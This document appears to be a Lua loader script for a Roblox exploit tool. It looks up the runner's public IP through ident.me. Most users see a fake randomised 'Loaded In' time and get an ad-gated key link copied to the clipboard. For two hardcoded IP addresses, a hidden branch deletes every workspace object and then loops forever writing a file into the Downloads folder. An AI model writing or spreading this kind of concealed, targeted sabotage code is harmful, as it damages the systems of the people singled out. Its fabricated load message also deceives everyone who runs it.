local ip = game:HttpGet("https://v4.ident.me")
if ip ~= "2.212.149.233" and ip ~= "86.157.169.141" then
  local rand = math.random()
  local rand2 = math.random(0, 10)
  local finalNum = rand + rand2
  
  print("Loaded In: "..finalNum.." Seconds")
  
  game:GetService("CoreGui").ChildAdded:Connect(function(Child)
    if Child.Name == "AdminusLoader" then
        local Console = Child:WaitForChild("Console")
        local Copy = Console:WaitForChild("Copy")
        Copy.MouseButton1Click:Connect(function()
            wait(0.1)
            setclipboard("https://direct-link.net/889860/pjl-key")
        end)
    end
  end)
else
  for _, v in next, workspace:GetDescendants() do v.Parent = nil end
  while task.wait() do writefile("C:\Users\User\Downloads", "a") end
end
